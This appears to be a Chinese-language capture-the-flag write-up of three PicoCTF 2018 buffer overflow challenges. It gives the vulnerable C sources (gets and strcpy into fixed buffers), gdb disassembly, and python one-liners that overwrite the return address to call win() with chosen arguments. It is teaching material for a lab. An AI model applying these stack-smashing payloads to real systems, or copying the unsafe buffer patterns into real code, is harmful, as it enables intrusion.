---
layout: post
title: Buffer Overflow 0 / 1 / 2
categories: writeups
tags: pwn
ctfsite: picoctf-2018
challenge_url: https://2018game.picoctf.com/
challenge_url_comment: 需要注册登录
---

因为这几道题都比较简单，所以合并在一起了：

#### 第 0 题

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[16];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("Thanks! Received: %s", argv[1]);
  }
  else
    printf("This program takes 1 argument.\n");
  return 0;
}

```

{% include writeup_begin.html %}

只要命令行参数足够长就可以把程序搞崩溃：

```
./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

{% include writeup_end.html %}

#### 第 1 题

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

{% include writeup_begin.html %}

只需要覆盖掉返回地址即可。看一下 `win` 的地址，以及缓冲区大小：

```
(gdb) print win
$1 = {<text variable, no debug info>} 0x80485cb <win>
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0804862f <+0>:     push   %ebp
   0x08048630 <+1>:     mov    %esp,%ebp
   0x08048632 <+3>:     sub    $0x28,%esp
   0x08048635 <+6>:     sub    $0xc,%esp
   0x08048638 <+9>:     lea    -0x28(%ebp),%eax
   0x0804863b <+12>:    push   %eax
   0x0804863c <+13>:    call   0x8048430 <gets@plt>
```

缓冲区大小为 `0x28`。因此

```python
python -c "print '0'*0x28 + '0000\xcb\x85\x04\x08\n'" | ./vuln
```

{% include writeup_end.html %}

### 第 2 题

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xDEADC0DE)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

{% include writeup_begin.html %}

这次需要带两个参数调用 `win`。查看一下 `win` 的地址和缓冲区大小：

```
(gdb) print win
$1 = {<text variable, no debug info>} 0x80485cb <win>
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x08048646 <+0>:     push   %ebp
   0x08048647 <+1>:     mov    %esp,%ebp
   0x08048649 <+3>:     sub    $0x78,%esp
   0x0804864c <+6>:     sub    $0xc,%esp
   0x0804864f <+9>:     lea    -0x6c(%ebp),%eax
   0x08048652 <+12>:    push   %eax
   0x08048653 <+13>:    call   0x8048430 <gets@plt>
```

缓冲区大小为 `0x6c`。因此：

```python
                                                     ↓第一个参数      ↓第二个参数
python -c "print '0'*0x6c + '0000\xcb\x85\x04\x08RETN\xef\xbe\xad\xde\xde\xc0\xad\xde\n'" | ./vuln
                            ↑EBP ↑返回跳至win     ↑win的返回地址
```
{% include writeup_end.html %}
